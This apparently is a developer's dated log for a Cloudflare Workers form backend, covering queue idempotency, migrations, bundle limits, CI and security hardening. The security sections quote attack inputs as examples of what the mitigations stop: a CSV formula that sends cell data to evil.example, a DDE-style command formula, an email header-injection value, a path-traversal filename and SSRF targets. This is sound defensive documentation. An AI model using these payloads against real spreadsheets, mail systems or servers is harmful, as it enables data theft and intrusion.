| Honeypot submission                      | ✅ fake success, **0 rows stored**      |
| `_redirect` to an external host          | ✅ ignored, went to `/thanks`           |
| Queues available on this account         | ✅ producer + consumer bound            |

**Concurrency — the reason for deploying:**

| Burst                  | Positions | Unique | Gap-free |
| ---------------------- | --------- | ------ | -------- |
| 20 concurrent (759 ms) | 1–20      | ✅     | ✅       |
| 50 concurrent (877 ms) | 72–121    | ✅     | ✅       |
| 122 rows total         | 1–122     | ✅     | ✅       |

The database agrees independently: 122 rows, positions contiguous from 1, all distinct,
and `forms.submission_count` matching the row count.

**So the Phase 1 reasoning holds in production.** `UPDATE … RETURNING` on a D1 database
backed by a single Durable Object serialises writes, and concurrent signups cannot collide
or skip. This was previously only verified in Miniflare.

> A first 50-request run reported "not gap-free" — the script assumed positions start at 1,
> but the form already held 21 signups so the burst ran 22–71. The script now anchors on
> the first position it sees. The code was right; the assertion was wrong.

### The dev config lives in its own file

Superseded the `env.dev` block: the dev configuration now lives in
**`wrangler.dev.jsonc`**, used explicitly via `-c`.

`wrangler.jsonc` is **cloned verbatim into every deploy-button user's repository**, so it
must contain no account-specific IDs and no dev-only names. A stray `database_id` there
would point a stranger's install at this account's database.

The split also fixed a leak that was already committed: with the env block in place,
`wrangler types` generated `APP_NAME: "FormFlare (dev)" | "FormFlare"` and an entire
`DevEnv` interface into the public `cloudflare-env.d.ts`. `cf-typegen` reads only
`wrangler.jsonc`, so the regenerated types are now production-only and the CI drift check
passes against them.

Scripts: `deploy:dev`, `db:migrate:dev`, `preview:dev`. `reset-password` gained
`-c/--config` so a reset can target the dev instance; every wrangler call in it carries
the same config, or the lookup and the write could land on different databases.

Phase 6 must confirm the deploy button does not see `wrangler.dev.jsonc` (checklist
item 7 in the plan).

### Teardown

The dev instance costs nothing at rest but is not needed once Phase 6 does the real
deploy-button test. To remove it:

```bash
npx wrangler delete --name formflare-dev --force
npx wrangler d1 delete formflare-dev
npx wrangler r2 bucket delete formflare-dev-uploads
npx wrangler queues delete formflare-dev-jobs
```

Keep `wrangler.dev.jsonc` either way: it is the documented way to re-run this
verification after a risky change. (Recreating the D1 database yields a new
`database_id`, which has to be pasted back into that file.)

### Turnstile tests no longer need the network

`tests/turnstile-mock.ts` stubs `fetch` for the siteverify URL only, so anything else
falls through to real fetch and a stub cannot silently mask an unrelated request. The
default suite is fully offline; `LIVE_TESTS=1 npm test` additionally runs two checks
against Cloudflare's real endpoint, which is what would catch the siteverify contract
changing out from under the stub.

> Worker sandboxes get an **empty `process.env`**, so the flag is forwarded as a Miniflare
> binding in `vitest.config.mts`. Reading `process.env.LIVE_TESTS` inside a test silently
> never matches, which is how the first version of this appeared to work while always
> skipping.

---

## 2026-09-17 — Phase 4

### Idempotency: the delivery row is the lock

Queues are **at-least-once**, so every job can arrive twice. Rather than hoping that
does not happen, `submission.created` writes a delivery row per intended send _before_
enqueuing anything, and each row carries a unique index —
`(webhook_id, submission_id)` and `(submission_id, kind, recipient)`.

The insert failing **is** the idempotency signal. Checking first with a SELECT would
reintroduce the race between two concurrent runs of the same job. Send jobs then carry
only a `deliveryId`: a redelivered job re-reads the row, sees a non-`pending` status and
stops. Embedding the content in the job would make a retry indistinguishable from a
fresh send.

Verified through the real queue, not just unit tests: six submissions produced exactly
six email deliveries and six webhook deliveries, one per submission.

> Migration numbering: `drizzle-kit` tracks only its own migrations in `meta/_journal.json`,
> so it reused `0001` — colliding with the hand-written `0001_waitlist_dedupe.sql`.
> Wrangler applies by filename, so the generated file was renamed to `0003` (and its
> snapshot with it). **Check the generated name against existing files whenever a
> hand-written migration is in the directory.**

### Consumer rules

| Situation               | Action                                  | Why                                                                                                                     |
| ----------------------- | --------------------------------------- | ----------------------------------------------------------------------------------------------------------------------- |
| Mailer unavailable      | `ack`, status `skipped_unavailable`     | Retrying cannot conjure a binding; it would burn the retry budget for nothing                                           |
| Transient send error    | `retry` with backoff (10s, 1m, 5m, 30m) | The next attempt might succeed                                                                                          |
| Final attempt reached   | `ack`, status `failed`                  | Stops the message circulating forever                                                                                   |
| Webhook 5xx / 408 / 429 | `retry`                                 | Receiver-side or explicitly invited                                                                                     |
| Webhook other 4xx       | `ack`, status `failed`                  | The receiver rejected _this_ payload; an identical resend fails identically                                             |
| Unknown job type        | `ack`                                   | Likely a rollback; retrying forever helps nobody                                                                        |
| Handler throws          | `retry`, or `ack` on the final attempt  | **Never rethrow** — an exception escaping the loop fails the whole batch and redelivers messages that already succeeded |

A test sends a batch containing a dangling reference, a valid job and a malformed job,
and asserts all three resolve exactly once with the valid one still sending.

### Auto-reply is the dangerous feature

It mails an address a stranger typed into a public form, from the owner's domain. Four
constraints, all tested:

1. **Off by default.**
2. **Owner-configured text only** — nothing submitted is echoed back, so the instance
   cannot relay attacker-authored content.
3. **One per address per 24 hours**, so a repeated submission cannot flood a victim.
   A row from the _same_ submission does not count against the limit, or a retry would
   throttle itself.
4. **A UI warning** recommending Turnstile before enabling it.

### Header injection and escaping

Email headers are newline-delimited, so a `Reply-To` of
`a@b.com\nBcc: victim@example.com` turns one alert into a mailing. Two separate
functions, because conflating them is how these bugs happen:

- `sanitiseHeader` — CR/LF/tab become spaces (deleting them would run words together),
  other C0 controls are removed outright.
- `escapeHtml` — for submitted content rendered in the alert body.
- `safeReplyTo` **rejects** rather than sanitises: a mangled Reply-To is worse than none,
  and anything with a newline is an attack, not a typo.

### Webhook signatures

HMAC over `"<timestamp>.<body>"`, not the body alone, so a captured request cannot be
replayed with a fresh timestamp — the signature would no longer match. Receivers should
reject anything outside **300 seconds**; documented with a Node example in `docs/api.md`,
including the warning to verify against the **raw** body (re-serialising changes
whitespace and key order) and to compare in constant time.

URLs are restricted to `https` and public hosts. An unchecked webhook URL is an SSRF
primitive — it is fetched from inside Cloudflare's network, so `169.254.169.254` or a
private range would be reachable. Re-validated at delivery time, not only when saved,
since a row may predate the check or DNS may have changed.

> The live run confirmed this fires: a webhook pointed at `localhost` was marked
> `failed` with "must point at a public host" and **not** retried. Repointed at a real
> public endpoint, it delivered with HTTP 200, and a separate check confirmed the
> signature round-trips intact through a real HTTP receiver.

### Email cannot be tested locally

Miniflare has no real `send_email` binding, and sending to arbitrary recipients needs a
paid plan and an onboarded domain. So the mailer is injectable and tests use a fake that
records instead of sending — everything about _what_ is sent (headers, escaping,
throttling, idempotency) is covered here, and _that_ it sends is Phase 6 checklist item 8
against the deployed instance.

---

## 2026-09-17 — Stuck-delivery recovery

### "Already exists" is not "already queued"

Phase 4's fan-out returned `null` for every unique-index collision, treating the row's
existence as proof the work was handled. It is not. A row can exist with no live job
behind it:

- the Worker was evicted between writing the row and enqueuing its job,
- `ctx.waitUntil` was cut short so `submission.created` never reached the queue, or
- a consumer marked the row `pending` for retry and that retry was lost.

Queues guarantee at-least-once delivery of messages they **accepted**; they guarantee
nothing about a message that was never enqueued. None of the above surfaces as a failure
— the row just sits at `pending` forever and the owner never gets their alert.

A collision now returns the existing id when the row is still `pending`, and `null` only
once it has genuinely resolved (`sent`/`success`/`failed`/`skipped_*`). Re-enqueuing a
pending row is safe because the consumer skips anything not `pending`.

> This changed three Phase 4 tests that asserted "second fan-out returns 0 jobs". The
> invariant that actually matters is **no duplicate rows**, which they still assert; the
> job count was encoding the old, weaker behaviour.

### `fanned_out_at` and a 15-minute sweep

`submissions.fanned_out_at` is set when fan-out completes. Null on an old submission
means the job never finished.

`runRecoverySweep` (cron `*/15 * * * *`) re-enqueues:

1. non-spam submissions older than 15 minutes with no `fanned_out_at`, and
2. `pending` deliveries not updated for 15+ minutes.

Deliberately cheap — three indexed lookups plus queue sends — because it runs 96 times a
day. The expensive sweeps (orphaned R2 objects, log pruning) stay in the daily cron, and
`worker.ts` routes on `event.cron` to keep them apart.

Two details that matter:

- **Spam is excluded.** Fan-out intentionally produces nothing for spam, so those rows
  never get a `fanned_out_at` and would otherwise be re-enqueued every 15 minutes forever.
- **Swept rows are touched.** Without updating `updated_at`, every sweep would re-enqueue
  the same delivery until its retry landed — four times an hour, multiplying the very
  backlog it exists to clear.

On upgrade, existing rows have `fanned_out_at = NULL` and look stuck. Backfill with
`UPDATE submissions SET fanned_out_at = created_at WHERE fanned_out_at IS NULL;` (done on
the dev instance). Harmless if skipped — re-fan-out is idempotent — but it keeps the sweep
from running on a permanent backlog.

### Migration numbering is Drizzle's job

`drizzle-kit` numbers migrations from its own `meta/_journal.json`, which knows nothing
about hand-written files, so it reuses numbers. Wrangler applies by **filename order**, so
a collision silently runs migrations in the wrong order.

Rule, now in `AGENTS.md`: hand-written SQL goes through
`npx drizzle-kit generate --custom --name <name>`, never a manually created file.

Verified after the Phase 4 rename: `npm run db:generate` on an unchanged schema reports
"No schema changes, nothing to migrate", and `--custom` correctly picked `0004` and
registered it in the journal. The journal's gap at 1–2 is expected — those are the
hand-written files Drizzle does not track.

### Production verification

Deployed to `formflare-dev` and submitted through the real endpoint:

| Check                                        | Result                                   |
| -------------------------------------------- | ---------------------------------------- |
| Migration `0004` on real D1                  | ✅ `fanned_out_at` column present        |
| Both cron schedules registered               | ✅ `*/15 * * * *` and `0 3 * * *`        |
| Webhook delivered via the production queue   | ✅ `success`, HTTP 200                   |
| Independent receiver captured it             | ✅ correct event, delivery id, timestamp |
| **HMAC signature validated by the receiver** | ✅                                       |
| `fanned_out_at` set on the new submission    | ✅                                       |

The signature check is the meaningful one: it proves encryption at rest, decryption in
the consumer, signing and delivery all work together on real infrastructure, verified by
something outside this codebase.

> `wrangler deploy` intermittently fails with "fetch failed" on a ~6.5 MB bundle while D1
> queries on the same connection succeed. Retrying works; a first failure can leave an
> empty Worker shell that then reports `[code: 10222] This Worker has no versions`, which
> needs `wrangler delete` before redeploying.

### The dev instance is no longer publicly reachable

`"workers_dev": false` in `wrangler.dev.jsonc`. It is a real, fully functional FormFlare
that happened to be on a guessable URL; there is no reason to leave it exposed between
verification runs. Confirmed: `/` and `/f/:id` both return 404 at the edge. The Worker,
its data and its cron triggers are untouched — flip the flag and redeploy to re-enable.

---

## 2026-09-17 — Bundle size

### The limit changed 13 days ago

The concern was that a Next.js bundle would exceed the **Workers Free** size limit and
break the one-click deploy. It does not, and the rule it would have broken no longer
exists.

Cloudflare [changed Worker size limits on 2026-09-04](https://developers.cloudflare.com/changelog/post/2026-09-04-increased-worker-size-limit/):

|        | Before 2026-09-04 | Now              |
| ------ | ----------------- | ---------------- |
| Metric | **compressed**    | **uncompressed** |
| Free   | 3 MB              | **64 MiB**       |
| Paid   | 10 MB             | **64 MiB**       |

> "Cloudflare checked that compressed size and rejected deploys over 3 MB (Free) or
> 10 MB (Paid). That limit has been removed." The `gzip` figure Wrangler prints is now
> "shown for reference but is no longer a limit."

### Where FormFlare sits

From `wrangler deploy --dry-run`:

| Metric                    | Value                   | Limit             | Headroom       |
| ------------------------- | ----------------------- | ----------------- | -------------- |
| **Uncompressed** (counts) | **6537 KiB** (6.38 MiB) | 64 MiB, all plans | **10.0% used** |
| gzip (reference only)     | 1311 KiB (1.28 MiB)     | —                 | —              |
| Assets                    | 38                      | 20,000 (Free)     | negligible     |

Comfortable on the free plan, and it would have passed the **old** 3 MB compressed free
limit too (1.28 MiB). No trimming needed.

The bundle is dominated by Next.js runtime internals — `@edge-runtime/primitives`
(784 K), the two `next-server` app-page runtimes (692 K + 680 K), `edge-runtime`
(516 K), `app-render` (364 K), `react-dom` server builds (272 K + 268 K). That is the
cost of the framework, not of application code, and trimming it would mean leaving
Next.js.

### The CI check is a regression alarm, not a deploy gate

`npm run check:size` parses the dry-run output and fails above **14,000 KiB
uncompressed** (roughly 2× current) or 5,000 assets. Deliberately far below the 64 MiB
platform limit: the point is to fire while the cause is still obvious — a heavy
dependency pulled into the Worker by accident.

**Startup time is the limit that actually bites.** It is a hard 1 second on every plan,
and an oversized bundle blows that long before it approaches 64 MiB. The check's failure
message says so. Verified the check fails when the ceiling is lowered, so it is not
vacuous.

### Backfill is now a migration

`0005_backfill_fanned_out.sql`, via `drizzle-kit generate --custom`. The manual `UPDATE`
run against `formflare-dev` was a one-off that no other instance would get; as a
migration, every instance upgrading past `0004` is covered. It sets the marker to
`created_at` rather than now — those rows _were_ handled at creation time, by the code
that ran before the column existed — and its `WHERE` clause makes re-running a no-op.
Confirmed as a no-op on dev (0 unfanned of 123).

### Migrations must be backward-compatible

Added to `AGENTS.md`. `npm run deploy` runs migrations **before** the upload, and the
upload can fail — this bundle intermittently does — leaving the new schema live under the
old code. Workers Builds can also serve the old version during a rollout.

So migrations are **additive only**: new tables, nullable columns, indexes. No renames or
drops of anything current code reads, and no NOT NULL column without a default. Removing
a column is a two-deploy operation.

---

## 2026-09-17 — Phase 5

### CSV formula injection

A spreadsheet evaluates any cell beginning `=`, `+`, `-`, `@`, tab or CR. A submitted
message of `=HYPERLINK("https://evil.example?x="&A1,"Click")` therefore exfiltrates other
cells when the **owner** opens their own export. Correct CSV quoting does not help: the
spreadsheet strips the quotes and evaluates what is inside.

Such values are prefixed with a single quote, not stripped — `+441234567890` and `-42.50`
are legitimate data, and deleting the leading character would silently corrupt them.

Verified against the running app, not only in unit tests: a submission whose email was
`=cmd|calc!A1` exported as `,'=cmd|calc!A1`, and no raw formula appears at any cell
boundary.

> A payload embedded inside the JSON `data` column is already harmless, because the cell
> starts with `{`. That is luck rather than design, so the escaping is applied to every
> cell regardless.

**UTF-8 BOM** is emitted so Excel on Windows does not render Arabic as mojibake. Asserted
on the raw bytes (`EF BB BF`), because `Response.text()` consumes the BOM while decoding
— a string-level assertion passes whether or not it was ever emitted.

Exports are **streamed** via `ReadableStream` and paged, so a large instance never
materialises the whole file in Worker memory, and every export writes an `audit_log`
entry: one request can remove every submission from the instance's control.

### Cursor pagination, not OFFSET

`OFFSET 10000` makes SQLite walk and discard 10,000 rows per page, and a row inserted
mid-pagination shifts every later page — duplicating or skipping entries. The cursor is
the submission id; ULIDs sort by creation time, so one column orders deterministically.
A test inserts a row between page 1 and page 2 and asserts zero overlap.

### A real bug the search test caught

`escapeLike()` prefixes `%` and `_` with a backslash, but **SQLite has no default escape
character**, so without an explicit `ESCAPE '\\'` clause the backslash is matched
literally and the escaped term finds nothing. Searching `100%` returned zero rows.
Drizzle's `like()` helper cannot express `ESCAPE`, so those two comparisons are raw
`sql` fragments.

v1 search is `LIKE` over `data_json` and `email`. Adequate for the volumes a self-hosted
form backend sees and it needs no extra table; FTS5 is noted in the code as the upgrade
if anyone reports slow search, since it would need a trigger-maintained index and a
migration.

### API

- **Per-key rate limiting** (`API_RATE_LIMIT`, 120/60s) keyed on the key id, not the IP:
  one noisy integration must not exhaust another's budget, and an IP is meaningless for
  server-to-server callers behind shared egress.
- **404, never 403, for ids outside the instance.** A distinct "forbidden" confirms the
  id exists, letting a caller with a valid key probe for another instance's ids.
- **Page size capped** at 200, so no caller can request the whole table.
- **`last_used_at` throttled to once a minute**, with the staleness check repeated in SQL
  so two concurrent requests cannot both write. Every authenticated request would
  otherwise be a D1 write, turning a read-only API into a write-heavy one.
- Keys are `ff_live_<48 hex>`; only the SHA-256 is stored, and creation and revocation
  are audited — an unexplained key is the first sign of a compromised session.

### File downloads

`Content-Disposition: attachment` plus `X-Content-Type-Options: nosniff`. Uploads are
attacker-supplied content served from the instance's own origin: rendered inline, an
uploaded `.html` or SVG is stored XSS against the dashboard's own session.

The filename is submitted by a stranger, so the quoted form is reduced to a safe subset
(no quotes, semicolons, CR/LF, path separators) and the real name is carried in the
percent-encoded `filename*` (RFC 5987). `../../etc/passwd` becomes `passwd`.

### Security headers, and the CSP compromise

`frame-ancestors 'none'`, `nosniff`, `Referrer-Policy: strict-origin-when-cross-origin`,
`Permissions-Policy`, and a CSP — applied via `headers()` rather than middleware, which
is skippable.

> ⚠️ **`script-src` includes `'unsafe-inline'`, and this is not an oversight.** Next's
> App Router inlines hydration bootstrap and flight data as inline `<script>` tags. A
> nonce-based policy needs a nonce threaded through every response, which OpenNext's
> static rendering cannot supply — pages would render but never hydrate, so every form
> silently stops working. Shipping a strict-looking CSP that breaks the app is worse
> than an honest one. Tightening this needs nonce support plus fully dynamic rendering.
>
> **`'unsafe-eval'` is added only in `next dev`.** React uses `eval()` there to
> reconstruct server-side error stacks. Production React never calls `eval()`, so the
> shipped CSP stays without it.

`challenges.cloudflare.com` is allowed in `script-src` and `frame-src`, or Turnstile
cannot load and no form with a captcha can be submitted.

`/f/*` is **excluded**: it is handled in `worker.ts` before Next sees it, is meant to be
called cross-origin from anyone's site, and returns JSON or a redirect rather than a
document. Verified that it carries no CSP while its CORS headers are intact.

Verified by building and driving the real app: no CSP violations in the console, and the
setup form — a React server action — submitted successfully, which proves hydration
still works.

### Accessibility

**Lighthouse 100/100 on `/inbox`, `/forms`, `/api-keys` and `/webhooks`**, zero failing
audits.

The first run scored 96, failing `color-contrast` on 43 elements: `text-zinc-500`
(#71717b) is **4.1:1** on white, under the 4.5:1 minimum. It was the metadata colour
throughout the dashboard. Now `text-zinc-600` with `dark:text-zinc-400`, both of which
clear the threshold.

Also verified what Lighthouse cannot: tab order reaches every control with a visible
focus ring, and of 146 focusable elements **zero lack an accessible name**.

---

## 2026-09-17 — First push and CI

### Two latent bugs that only a fresh checkout could find

Both were masked locally by a previous build, and both would have broken a
deploy-button user cloning the repo. CI on a clean runner was the first thing to
exercise that path.

**1. `LayoutProps<"/">` does not exist before a build.** `src/app/layout.tsx` used
Next's generated route type, which lives in `.next/types/` — a gitignored build
artefact. On a fresh clone `tsc` fails with `Cannot find name 'LayoutProps'`. It came in
with the original create-next-app scaffold and had been invisible for the whole project,
because a build had always run first. Replaced with an explicit
`{ children: React.ReactNode }`, which needs no build step. Verified against a clone with
no `.next/`.

**2. Tests require the OpenNext build.** vitest loads `worker.ts` as the Worker entry
point, and `worker.ts` imports `./.open-next/worker.js` — also gitignored. Every one of
the 22 suites failed to import on a clean checkout. CI now builds before testing, and the
bundle-size check reuses that build. Reproduced locally by moving `.open-next` aside:
same 22 failures, same error.

> The shared lesson: a green local test run says nothing about a clean clone when build
> artefacts are gitignored. Both failures were invisible until the first CI run.

### gitleaks-action cannot scan an orphan-rooted repository

The action runs `gitleaks detect --log-opts=...<base>^..<head>`. `main` starts from an
orphan "Initial commit" with **no parent**, so `^` does not resolve, git exits with
`fatal: ambiguous argument`, and the action fails on every push. It reported
"no leaks found" — the failure was the revision range, not a secret.

Replaced with a direct invocation over the full history, which avoids the parent
reference entirely and is fast at this size. `actions/checkout` needs `fetch-depth: 0`,
or the default shallow clone leaves a whole-history scan looking at a single commit.

### Secret scan before the first push

Full history (15 commits at the time) produced **3 findings, all false positives**: the
word "Password" in a doc comment and two plan bullets, where the "secret" gitleaks
extracted was the literal string `PBKDF2-SHA-256`. Targeted greps for the project's own
formats — `ff_live_`, `whsec_`, session cookies, `.dev.vars`, `.env`, real PBKDF2 hashes
— found nothing. The only hash in history is the all-zeros `DUMMY_HASH` constant used to
equalise login timing.

**Cloudflare account id: 0 occurrences.** The dev D1 `database_id` appears in
`wrangler.dev.jsonc` and this file; it identifies a database but is not a credential and
is useless without account access. Six other UUIDs are Drizzle migration-snapshot ids.

`.gitleaks.toml` allowlists only those documented false positives. **Verified the config
still detects a real secret** by planting a Stripe key and confirming it was caught — an
allowlist that silences everything would be worse than no scanner.

### History was squashed before the first push

`main` is a single "Initial commit" plus CI fixes; the 15-commit development history is
preserved on the local `history-backup` branch, which was deliberately **not** pushed.
The tree was verified byte-identical between the two before switching.

---

## 2026-09-17 — Deploy button test findings

A real deploy on a **fresh Cloudflare account** found things no local test could.

### R2 requires a payment card — so it is now optional

Activating R2 requires a payment method **even to stay inside its free tier**
([confirmed in Cloudflare's docs and community threads](https://developers.cloudflare.com/r2/pricing/)).
Because `wrangler.jsonc` listed an `r2_buckets` entry, the Deploy page **blocked the
deploy** until the card was added. That contradicts "runs free on your own Cloudflare
account" and is a hard stop at the first screen, for a feature most contact forms and
waitlists never use.

`wrangler.jsonc` now has **no R2 binding**. File uploads are opt-in:

- `Storage` gained an `available` flag; `r2Storage(undefined)` returns an
  `unavailableStorage` whose reads and deletes are no-ops (nothing was ever stored) and
  whose `put` throws as a guard against a missed check.
- The submission handler rejects files with a clear message rather than accepting the
  submission and silently dropping the attachment.
- `/setup` shows R2 as ⚠️ **optional**, not ❌, and the fix text mentions the card.
- Form settings warn when a file field cannot work.
- The daily orphan sweep is skipped entirely without a bucket.

The Phase 1 platform-adapter layer is what made this a contained change: business logic
depends on `Storage`, never `env.BUCKET`.

`BUCKET` is declared optional in `src/types/env.d.ts`; tests bind a real bucket through
`vitest.config.mts`, because the upload paths still have to be exercised for owners who
do add one.

### `workers_dev` and `preview_urls` are now explicit

**`workers_dev: true`** — the documented default is already `true`, but the fresh account
came up with the subdomain **disabled and no URL at all**, leaving a deployer with an
unreachable Worker and no obvious fix. Never rely on that default again.

**`preview_urls: false`** — preview URLs are public and hit the **same D1 database** as
production. An older version of an instance would stay reachable, serving real
submissions, on a URL that never expires and misses later fixes. Not acceptable for an
app holding other people's form data.

### Preview and the embed snippet disagreed

A new standard form stores `fields_json: "[]"`, and the preview page and the embed
snippet each had their **own hardcoded fallback** — the snippet showed name/email/message,
the preview only email. No data was lost (the preview never asked for the other fields),
but an owner testing their form saw a different form from the one their visitors get.

Both now derive from `effectiveFields()` in `src/lib/submissions/fields.ts`, so they
cannot drift again.

### Bundle growth was our own code

8,596 KiB, up from 6,537. Reproduced locally, so not a deploy artefact: the earlier
figure predated Phase 5, and route count went **5 → 12** — each App Router page pulls its
own SSR chunk. Framework files are unchanged. Still 13% of the 64 MiB limit with 35 ms
startup, but the CI ceiling was raised 14,000 → 20,000 KiB, since 38% headroom would have
started false-alarming on the next feature.

### Not bugs

- **Worker name prefilled as "FormFlare"** — Cloudflare derives the default from the
  _repository_ name, not our config, which correctly says lowercase `formflare`.
- **Node DEP0190** — fires on `spawn` with `shell: true` plus an args array. Neither of
  our scripts passes `shell: true`, neither runs during a Cloudflare deploy, and our
  build emits zero occurrences. It comes from Cloudflare's build tooling.

### `typecheck` no longer uses incremental builds

While making `BUCKET` optional, `tsc` reported errors that vanished and reappeared
depending on cached state — `incremental: true` was serving a stale type graph that
predated the augmentation.

Two fixes: `typecheck` now passes `--incremental false` so results are deterministic, and
`tests/tsconfig.json` explicitly includes `../src/types/env.d.ts` — it already included
`cloudflare-env.d.ts`, so the augmentation was missing whenever tests pulled in app files.
`*.tsbuildinfo` is gitignored.

> Worth remembering: a type error that comes and goes between identical runs is a caching
> artefact, not a type error. Chasing the symptom wasted several cycles here.

### UI

- Inbox timestamps show the **viewer's local time**, with UTC in the tooltip. Implemented
  with `useSyncExternalStore` rather than `useEffect` + `setState`: the server cannot know
  the viewer's timezone, and this is React's supported way to return a different value per
  side without a hydration mismatch or a second render.
- Filters and export buttons are **hidden until the first submission** — five controls
  that narrow nothing are noise on an empty inbox — and reappear whenever a filter is
  active so it can always be cleared.
- The empty inbox links to **Create your first form** when no form exists yet.

### Deferred work (agreed 2026-09-17)

- [x] **R2 cleanup on delete** — done in Phase 3 (`src/lib/submissions/delete.ts`).
- [x] **Daily orphan sweep** — done in Phase 3, wired into `runDailyMaintenance`.
- [x] **Queue consumer email rules** — done in Phase 4.

### Resolved at v0.1.0

- [x] **License.** MIT (`LICENSE`). Chosen before launch, as the plan required.
- [x] **Deploy button does not prompt for secrets.** Verified on a fresh Cloudflare
      free account: no payment method, no API tokens. `.dev.vars.example` is fully
      commented (`SETUP_TOKEN` stays opt-in and commented). File kept.
- [x] **Pricing claims rechecked for release.** README and the v0.1.0 notes: free plan
      with no card; R2 needs a card even on its free tier (so it is optional); email to
      arbitrary recipients needs Email Sending on Workers Paid; verified destinations
      are free.

## 2026-09-17 — Update path for deployed copies

The Deploy button **clones**, so a deployer's repository has no upstream link, no
"Sync fork", and no way to receive fixes. Everything below was verified against a real
deployment (`formflare-test2`) rather than reasoned about.

### Histories are unrelated

`git merge-base` between the clone's `main` and ours returns **nothing**. Root commits:
clone `6c42fcfc` ("source repo import", authored by `cloudflare[bot]`), ours `ac3daa44`.

So `git merge` has no base to work from. The obvious design — push upstream's release
tag to a branch and open a PR — is **actively destructive** here: with no merge base
GitHub diffs the trees directly, so every deployer-only file shows as a deletion and
every deployer edit as a revert. Tested, and it proposed deleting a file the deployer
had added.

Instead `scripts/check-update.mjs` fetches the two release tags by URL, diffs them, and
replays that patch onto the deployer's own `main` with `git apply --3way`. Their commits
stay the base, so their customisations survive. This works whether or not the histories
are related, which also makes it robust if Cloudflare ever changes how it clones.

Details that cost real debugging:

- **`git apply` is atomic.** One file that will not apply discards every other file's
  changes. Applied per file instead, so one conflict costs one file.
- **Binary patches must not be trimmed.** A binary patch ends with a blank line;
  stripping it produces `error: corrupt binary patch`. Patch text bypasses the trimming
  `git()` helper via `gitRaw()`. Covered by a test with a real binary file.
- **The version must be set explicitly** in the update commit. Relying on the patch to
  carry `package.json` fails when a release changes no other line of it, or when that
  file conflicts — and the same update is then offered forever.
- **Pre-release tags are ignored, not ordered.** `Number("0-beta")` is `NaN` and every
  `NaN` comparison is false, so `v0.2.0-beta.1` compared as *equal* to `v0.2.0`. We tag
  stable releases only; see AGENTS.md.

### Cloudflare strips `.github/` when cloning

The clone contains **no `.github` files at all**: 146 files versus our 148, missing
exactly `ci.yml` and `update-check.yml`. Both existed upstream at clone time (the clone
was created between commits `3ffdcc7` and `752d971`, and `ci.yml` had been there since
the initial commit), so this is stripping, not a version lag. Undocumented by Cloudflare;
most likely because its GitHub App lacks the `workflows` permission — the same
restriction that stops `GITHUB_TOKEN` pushing workflow changes (verified separately: the
remote rejects such a push even with `contents: write`).

Consequence: **the update workflow never reaches a deployer**. `scripts/check-update.mjs`
*is* copied, so the documented path is to run it locally; copying the workflow in is
optional and needs the `workflow` permission. An in-app "update available" banner is
planned for v0.2.0 so deployers who never read the README still find out.

Side effect, and a welcome one: our CI does not run in deployers' repositories either,
which is what the `if: github.repository == 'SeifElkadyy/FormFlare'` guard on `ci.yml`
was for. The guard stays, because a deployer who copies workflows in should still not
run our test suite and secret scan by default.

### First build fails with "Could not read package.json"

Cloudflare creates the repository and starts a build in parallel with importing the
source, so the first build can run against an empty commit. Confirmed that the
`source repo import` commit *does* contain `package.json` (2535 bytes, 146 files), so
the build that failed ran before it landed. **Retrying does not help** — the retry
rebuilds the same empty commit; pushing any new commit does. Nothing in this repository
can prevent it, so it is documented in the README and `docs/troubleshooting.md`.
